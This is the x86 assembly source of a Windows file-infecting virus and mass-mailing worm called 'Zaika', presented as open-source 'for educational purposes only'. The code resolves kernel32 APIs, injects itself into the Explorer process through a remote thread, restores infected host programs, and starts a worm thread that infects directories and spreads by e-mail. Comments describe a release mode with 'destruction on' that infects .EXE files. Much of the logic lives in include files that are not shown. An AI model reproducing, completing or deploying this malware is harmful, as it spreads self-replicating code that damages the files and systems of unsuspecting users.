;============================zaika==============================;
;    This source is for educational purposes only. Author does not take		;
;            responsibility for the consequences of its usage				;
;					This is open-source program								;
.586
locals 
jumps
.model flat, stdcall


DEBUG equ 0			; debug console
RELEASE	equ 1	; 
NORELEASE	equ 0
;RELEASE=0 NORELEASE=1 - 	destruction off, infecting *.MZD, 
;					beep at infection
;RELEASE=1 NORELEASE=0 - 	destruction on,  infecting *.EXE

callW macro f
extrn f:proc
	call f
endm

include windows.inc
include consts.inc
include pestruct.inc
include structs.inc
include eaxapi1.inc ;definitions of macro
MB_TOPMOST	equ 40000h

.data
start:

	mov 1 ptr [dropper], 1
	lea eax, [_start]
	push esp esp 0 0 eax 10000h 0
	callW CreateThread
	pop ecx

	
_exit:
	push 30000
	callW Sleep
	push 0
	callW ExitProcess


;org 100h
db ".beg."
virstart:
_realstart:
	;  after decryption execution gets here
_start:
	call recalc
recalc:
rec	db 5Dh ; pop ebp

	call get_kernel
	push kernel32_api_num
	pop ecx
__Kernel32 equ _LoadLibraryA-5
	lea esi, [ebp+__Kernel32-rec]
	call get_apis ; get kernel32 apis

	lea eax, [ebp+thread1-rec]
	push esp esp 0 0 eax 10000h 0
	xcall CreateThread
	pop ecx


	; if worm, copy to sysdir, set autorun & exit
	cmp 1 ptr [ebp+worm-rec], 0
	jz __5687
	call worm_startup
	push 3000
	xcall Sleep
	push 0
	xcall ExitProcess
__5687:


	; restore host program if not dropper
	cmp 1 ptr [ebp+dropper-rec], 0
	jnz __567
	lea ebx, [ebp+replace-rec]
	mov edi, [ebx].to_rva
	lea esi, [ebp+backup-rec]
	mov ecx, [ebx].sizeinbytes
	pushad
	push esp
	push esp
	push PAGE_READWRITE
	push ecx
	push edi
	xcall VirtualProtect
	pop eax
	popad
	rep movsb
	; restore jmp
	cmp 1 ptr [ebp+isjmp-rec], 0
	jz __567

	lea ebx, [ebp+jmpreplace-rec]
	mov edi, [ebx].to_rva
	lea esi, [ebp+jmpbackup-rec]
	mov ecx, jmpsize
	pushad
	push esp
	push esp
	push PAGE_READWRITE
	push ecx
	push edi
	xcall VirtualProtect
	pop eax
	popad
	rep movsb

__567:
	

_out:
	cmp 1 ptr [ebp+dropper-rec], 0
	jz __return_to_host
	; exit thread if dropper
	push 0
	xcall ExitThread
__return_to_host:
	; return to host if not dropper
	lea eax, [ebp+__jmp_addr+4-rec]
	mov ecx, [ebp+retaddr-rec]
	sub ecx, eax
	mov [ebp+__jmp_addr-rec], ecx
	popad
	db 0E9h	; jmp far
__jmp_addr	dd ?
	nop

retaddr	dd offset _exit;401000h

; macro
copy_to_stack	macro thread1, _stack_exec1
local ddx
local begin
thread1:
begin:
	call ddx
ddx:
	pop ebp
	sub ebp, (ddx-recalc)
	mov eax, ebp
	sub eax, esp
	cmp eax, (recalc-virstart); test if we are in stack
	jz _stack_exec1
	; not in stack
	; copy ourselves to stack
	sub esp, virsize
	and esp, -4 ; align esp to 4 
	mov edi, esp
	lea esi, [ebp+virstart-rec]
	mov ecx, virsize
	rep movsb
	lea eax, [esp+(thread1-virstart)]
	jmp eax
endm

	copy_to_stack thread1, _stack_exec1

_stack_exec1:
	sub esp, 500h

;	mov 1 ptr [ebp+worm-rec], 0		; clear worm flag
	call loaddll2

IF DEBUG EQ 1
__msvcrt	equ	_sprintf-5
	lea eax, [ebp+_msvcrt-rec]
	push eax
	xcall LoadLibraryA
	mov [ebp+_Default-rec], eax
	lea esi, [ebp+__msvcrt-rec]
	push msvcrt_api_num
	pop ecx
	call get_apis
ENDIF

;)	
openm:
	lea eax, [ebp+mutexname-rec]
	push eax
	push 1
	push 1f0001h	; MUTEX_ALL_ACCESS
	xcall OpenMutex

	; wait for release of mutex
	mov 4 ptr [ebp+hmutex-rec], eax
	test eax, eax
	jz processing
	push -1
	push eax
	xcall WaitForSingleObject

	; mutex is released

processing:
	sub eax, eax
	mov 1 ptr [ebp+isseh-rec], al

;	jmp run_local_thread
	; let us go

	; look for explorer
	push 'd'
	push 'nWya'
	push 'rT_l'
	push 'lehS' ;Shell_TrayWnd
	mov eax, esp
	push 0
	push eax
	xcall FindWindowA
	or eax, eax
	jz foregr_win;exit_thread1
	mov esi, eax
	add esp, 16
	jmp cy1
	; if no explorer, get topmost window
foregr_win:
	xcall GetForegroundWindow
	mov esi, eax

cy1:
	push eax
	push esp
	push eax
	xcall GetWindowThreadProcessId
	pop edx
	or eax, eax
	jz exit_thread1
	mov edi, eax


;efork(pid, paddr, icaddr, ofs, ics, hwnd, thid)
	push edi
	push esi
	push virsize+1
	push (thread2-virstart)
	lea eax, [ebp+virstart-rec]
	push eax
	push 0 
	push edx
	call efork
	or eax, eax
	jnz exit_thread1

	; run local thread if we can not run remote one
run_local_thread:
	lea eax, [ebp+thread2-rec]
	push esp esp 0 0 eax 10000h 0
	xcall CreateThread
	pop ecx

exit_thread1:



	push 200
	xcall Sleep	; wait while thread copies itself to stack
	push 0
	xcall ExitThread	; exit

__mutex_name 	equ "fg", 0
__hmap 	db 0

; stack variables

valuessize 	equ 400h ; local stack values size
; variables begin at ebp-8
_thid	equ ebp-08h
_hwnd	equ ebp-0Ch
fdata 	equ ebp-4 ptr 150h
ahand		equ ebp-4 ptr 154h	
hmap		equ ebp-4 ptr 158h
fbase		equ ebp-4 ptr 15Ch
rvaalloc 	equ ebp-4 ptr 160h
i		equ ebp-4 ptr 164h
fsize		equ ebp-4 ptr 168h
newfsize	equ ebp-4 ptr 16Ch
fpos		equ ebp-4 ptr 170h
rvapos	equ ebp-4 ptr 174h
loaderbuf	equ ebp-4 ptr 178h	; pointer to loader buffer 
virbuf	equ ebp-4 ptr 17Ch	; pointer to virus buffer 
hmap		equ ebp-4 ptr 180h
tbl	equ ebp-4 ptr 184h
jmpofs	equ ebp-4 ptr 188h
injofs	equ ebp-4 ptr 18Ch
loaderphysaddr 	equ ebp-4 ptr 190h
newimagesize 	equ ebp-4 ptr 194h
newsectionvirtsize	equ ebp-4 ptr 198h
newsectionphyssize	equ ebp-4 ptr 19Ch
diffaddr	equ ebp-4 ptr 1A0h
codesegphysaddr	equ ebp-4 ptr 1A4h
enchash	equ ebp-4 ptr 1ACh		; 	hash [8 bytes]
hfind equ ebp-4 ptr 1B0h
tempdir	equ ebp-1 ptr 2B0h
tempdirl	equ ebp-1 ptr 3B0h
success	equ ebp-4 ptr 3B4h	; признак успешного заражания файла
countinfect	equ ebp-4 ptr 3B8h
level   equ ebp-4 ptr 3BCh	; recursion level
dsk equ ebp-1 ptr 3CCh
infected	equ ebp-4 ptr 3D0h
jmpflag	equ ebp-4 ptr 3D4h
try	equ ebp-4 ptr 3D8h
yes	equ ebp-4 ptr 3DCh
indexes 	equ ebp-4 ptr 3E0h
initial_key	equ ebp-4 ptr 3E4h
final_key	 equ ebp-4 ptr 3E8h


;***  thread2 - main thread
	copy_to_stack thread2, stack_exec

stack_exec:
	sub esp, valuessize

	mov ax, ds
	cmp ax, 100h
	jl _45345
	call setseh	
_45345:

createm:
	lea eax, [ebp+mutexname-rec]
	push eax
	push 1
	push 0
	xcall CreateMutex
	mov 4 ptr [ebp+hmutex-rec], eax
	test eax, eax
	jz halt

	; set work mode 
;	call setmode

	call initthread

IF DEBUG EQ 1
	call _init
	call __76786
	db "03", 0
__76786:
;	call _cout
	xcall SetConsoleTitleA
ENDIF

	; run worm thread
	lea eax, [ebp+thread4-rec]
	push esp esp 0 0 eax 10000h 0
	xcall CreateThread
	pop ecx

	push -1		; debug
	xcall Sleep
	
vir_exit:
	; release mutex
	push 4 ptr [ebp+hmutex-rec]
	xcall ReleaseMutex
	push 4 ptr [ebp+hmutex-rec]
	xcall CloseHandle

vir_exit2:
	; free memory 
	mov eax, [tbl]
	call _vfree
	mov eax, [loaderbuf]
	call _vfree

halt:
	; exit
	push 0
	xcall ExitThread


; *** thread4 - worm
	copy_to_stack thread4, _stack_exec4

_stack_exec4:
	sub esp, valuessize

	mov ax, ds
	cmp ax, 100h
	jl _45340
	call setseh	
_45340:


	call initthread

	call loaddll1
	xcall dllproxy
	
	call infectdir
	or eax, eax
	jz nospread

IF DEBUG EQ 1
	call __76781
	db 13,10,"waiting e-mail client...",13,10,0
__76781:
	call _cout
ENDIF


	call mailspread	

nospread:	

__571:	
	jmp vir_exit2
; *** end of thread4

	; thread initializing
initthread:
	; set low priority
	xcall GetCurrentThread
	push -15
	push eax
	xcall SetThreadPriority

	; allocate memory for buffers
	mov eax, loader_size*loader_mult
	call _valloc
	mov [loaderbuf], eax
	; init tbl
	mov eax, 2048
	call _valloc
	mov [tbl], eax
	push eax
	call disasm_init
	add esp, 4
	ret


; set access violation handler
setseh:
	call set_new_eh
	pushad
	mov ebx,dword ptr [esp+cPushad+EH_ExceptionRecord]
	cmp dword ptr [ebx.ER_ExceptionCode],EXCEPTION_ACCESS_VIOLATION
    jne exception_handler
   	; handler for access violation
	xcall ExitThread
exception_handler:
	popad
	xor eax,eax
	ret
set_new_eh:;set SEH frame
	xor edx,edx
	push dword ptr fs:[edx]
	mov fs:[edx],esp
;	add esp, 08h
;	ret
	jmp [esp+8]

loaddll2:
	; load remaining DLL
__user32 equ _MessageBoxA-5
	lea eax, [ebp+_user32-rec]
	push eax
	xcall LoadLibraryA
	or eax, eax
	jz exit_thread1

	mov [ebp+_Default-rec], eax
	lea esi, [ebp+__user32-rec]
	push user32_api_num
	pop ecx
	call get_apis

__psapi	equ	_EnumProcessModules-5
	lea eax, [ebp+_psapi-rec]
	push eax
	xcall LoadLibraryA
	or eax, eax
	jz __54
	mov [ebp+_Default-rec], eax
	lea esi, [ebp+__psapi-rec]
	push psapi_api_num
	pop ecx
	call get_apis

__54:
	ret

loaddll1:
	; уЁєчшь dll1 
	; load dll1
	apiaddr GetProcAddress, rec
	push eax
	apiaddr LoadLibraryA, rec
	push eax
	apiaddr VirtualFree, rec
	push eax
	apiaddr VirtualProtect, rec
	push eax
	apiaddr VirtualAlloc, rec
	push eax
	lea eax, [ebp+dll1-rec]
	push eax
	call dllload
	add esp, 6*4
	or eax, eax
	jz __32
	mov 4 ptr [ebp+_Default-rec], eax
	
	push dll1_api_num
	pop ecx
__dll1 equ _wcopy-5
	lea esi, [ebp+__dll1-rec]
	push ebx
	call get_apis
	pop ebx
__32:
	ret


max	equ 2000
mutexname	db "AMX",0		; mutex name
hmutex	dd 0


include eaxapi2.inc
include efork.inc
include findmod.inc
include valloc.inc
include lde32bin.inc
include inf.inc
include infectd.inc
include find.inc
include sethook.inc
;include recinf.inc
include perm.inc
;include share.inc
;include makepe.inc
include mlspread.inc
include worm.inc
include win32api.inc
include useful.inc

IF DEBUG EQ 1
include console.inc
ENDIF


kernel32_api_num	equ 71
declfunc	LoadLibraryA
declfunc 	OpenProcess
declfunc 	GetVersion
declfunc 	GetCurrentThread
declfunc 	SetThreadPriority
declfunc	CreateToolhelp32Snapshot
declfunc	Module32First
declfunc	Module32Next
declfunc	GetCurrentProcessId
declfunc	GetCurrentProcess
declfunc	CreateFileMappingA
declfunc	MapViewOfFile
declfunc	UnmapViewOfFile
declfunc	CloseHandle
declfunc	VirtualAlloc
declfunc	VirtualFree
declfunc	GlobalAlloc
declfunc	GlobalFree
declfunc	CreateThread
declfunc	CreateEventA
declfunc	ReadProcessMemory
declfunc	WriteProcessMemory
declfunc	VirtualProtectEx
declfunc	GetModuleHandleA
declfunc	DuplicateHandle
declfunc	ExitThread
declfunc	Sleep
declfunc	ExitProcess
declfunc	ReleaseMutex
declfunc	OpenMutex
declfunc	CreateMutex
declfunc	CreateFileA
declfunc	CreateProcessA
declfunc	CreateProcessW
declfunc	WaitForDebugEvent
declfunc	WaitForSingleObject
declfunc	ContinueDebugEvent
declfunc	TerminateProcess
declfunc	SetCurrentDirectoryA
declfunc	GetCurrentDirectoryA
declfunc	FindFirstFileA
declfunc	FindNextFileA
declfunc	FindClose
declfunc	GetWindowsDirectoryA
declfunc	GetSystemDirectoryA
declfunc	lstrcmpiA
declfunc	SetThreadContext
declfunc	GetThreadContext
declfunc	SuspendThread
declfunc	AllocConsole
declfunc	VirtualProtect
declfunc	ResumeThread
declfunc	TerminateThread
declfunc	GetFileSize
declfunc	PulseEvent
declfunc	SetEvent
declfunc	CopyFileA
declfunc	DeleteFileA
declfunc	GetThreadSelectorEntry
declfunc	WriteFile
declfunc	GetStdHandle
declfunc	GetLocalTime
declfunc	SetConsoleTitleA
declfunc	RegisterServiceProcess
declfunc	Beep
declfunc 	GetLocaleInfoA
declfunc	SetFileTime
declfunc	CreateDirectoryA
declfunc	RemoveDirectoryA
declfunc	GetProcAddress
declfunc	OpenFileMappingA

_user32	db "user32",0
user32_api_num	equ 20
declfunc	MessageBoxA
declfunc	SetWindowsHookEx
declfunc	UnhookWindowsHookEx
declfunc	CallNextHookEx
declfunc	SendMessageA
declfunc	GetWindowThreadProcessId
declfunc	FindWindowA
declfunc	CreateWindowExA
declfunc	CreateWindowExW
declfunc	MessageBoxExA
declfunc	MessageBoxExW
declfunc	MessageBoxW
declfunc	DialogBoxParamA
declfunc	DialogBoxParamW
declfunc	DialogBoxIndirectParamA
declfunc	DialogBoxIndirectParamW
declfunc	CreateDialogParamA
declfunc	CreateDialogParamW
declfunc	GetWindow
declfunc	GetForegroundWindow

_psapi	db "psapi",0
psapi_api_num	equ 1
declfunc	EnumProcessModules

_mpr	db "mpr",0
mpr_api_num	equ 3
declfunc	WNetOpenEnumA
declfunc	WNetCloseEnum
declfunc	WNetEnumResourceA

_ws2_32	db "ws2_32",0
ws2_32_api_num	equ 2
declfunc	send
declfunc	WSAStartup

dll1_api_num 	equ 8
declfunc	wcopy
declfunc	_uuencode@12
declfunc	_newsend@16
declfunc	_newGPA@8
declfunc	_setbufenc@4
declfunc	_setsendaddr@8
declfunc	WaitForMailRun
declfunc	dllproxy


IF DEBUG EQ 1
_msvcrt	db "msvcrt",0
msvcrt_api_num	equ 1
declfunc	sprintf
ENDIF

db "Zaika (c) 2003", 0	; name

replace_struc	struc
from_rva	dd ?
to_rva		dd ?
sizeinbytes		dd ?
replace_struc	ends
; static variables
vloader_size	dd 0
vvir_size	dd 0
; replace struct
replace	db 1*(size replace_struc)	dup (0)
jmpreplace		db 1*(size replace_struc)	dup (0)
loader_mult	equ 10
backup db 1+loader_size*loader_mult	dup (0); multiplier due to permutation
jmpsize equ 5
jmpbackup	db jmpsize	dup(0)
isjmp	db 0

worm		db 1	; worm flag, it true - no return to host program
dropper	db 1
isseh		db 0
ev 	dd 0
act db 0

systimestruct:
year dw 0766h
month dw 0544h
dayweek dw 0453h
day dw 0346h
dw 04574h,02346h,07675h,06555h

_inj_code_size	equ $-thread2
stacksize 	equ $-thread2 ;$-start
virsize	equ $-_start+10h
db ".end."
end start
ends
